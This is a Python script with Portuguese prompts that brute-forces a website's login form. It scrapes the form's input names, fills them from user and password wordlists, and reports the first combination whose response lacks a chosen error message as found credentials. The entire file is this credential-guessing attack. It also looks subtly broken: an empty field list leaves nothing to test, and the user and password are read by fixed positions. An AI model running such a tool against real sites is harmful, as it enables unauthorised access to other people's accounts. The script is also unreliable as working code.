import requests
import time
import itertools
from bs4 import BeautifulSoup

def fazer_requisicao(url, payload):
    response = requests.post(url, data=payload)
    return response.text

def buscar_campos(url):
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        campos = {}
        for input_tag in soup.find_all('input'):
            if input_tag.get('name'):
                campos[input_tag['name']] = []
        return campos
    return None

def substituir_variaveis(url, campos, cooldown, mensagem_erro=None):
    combinacoes = list(itertools.product(*campos.values()))
    total_combinacoes = len(combinacoes)
    print('Total de combinações a serem testadas:', total_combinacoes)

    for i, combinacao in enumerate(combinacoes, start=1):
        payload = dict(zip(campos.keys(), combinacao))

        resposta = fazer_requisicao(url, payload)
        if mensagem_erro is not None and mensagem_erro not in resposta:
            return {
                'host': url,
                'usuario': combinacao[0],
                'senha': combinacao[2]
            }
        elif mensagem_erro is None and resposta:
            return resposta

        print(f'Combinação {i}/{total_combinacoes} testada. Aguardando cooldown...')
        time.sleep(cooldown)

    return None

def main():
    site_url = input('Informe o URL do site alvo: ')
    cooldown = int(input('Informe o tempo de cooldown em segundos: '))

    campos = buscar_campos(site_url)
    if campos is None:
        print('Não foi possível encontrar os campos no host alvo.')
        return

    usar_wordlist_usuario = input('Deseja usar uma wordlist para o campo "Usuário"? (S/N): ')
    if usar_wordlist_usuario.upper() == 'S':
        wordlist_usuario = input('Informe o caminho para a wordlist de Usuário: ')
        with open(wordlist_usuario, 'r', encoding='utf-8', errors='ignore') as arquivo_usuario:
            campos['user'] = arquivo_usuario.readlines()

    usar_wordlist_alvo = input('Deseja usar uma wordlist para o campo "Alvo"? (S/N): ')
    if usar_wordlist_alvo.upper() == 'S':
        wordlist_alvo = input('Informe o caminho para a wordlist de Alvo: ')
        with open(wordlist_alvo, 'r', encoding='utf-8', errors='ignore') as arquivo_alvo:
            campos['target'] = arquivo_alvo.readlines()

    usar_wordlist_senha = input('Deseja usar uma wordlist para o campo "Senha"? (S/N): ')
    if usar_wordlist_senha.upper() == 'S':
        wordlist_senha = input('Informe o caminho para a wordlist de Senha: ')
        with open(wordlist_senha, 'r', encoding='utf-8', errors='ignore') as arquivo_senha:
            campos['password'] = arquivo_senha.readlines()

    erro_personalizado = input('Informe a mensagem de erro personalizada (ou deixe em branco): ')

    resultado = substituir_variaveis(site_url, campos, cooldown, erro_personalizado)

    if resultado is not None:
        print('Combinação encontrada:')
        print('Host:', resultado['host'])
        print('Usuário:', resultado['usuario'])
        print('Senha:', resultado['senha'])
    else:
        print('Nenhuma combinação encontrada.')

if __name__ == '__main__':
    main()
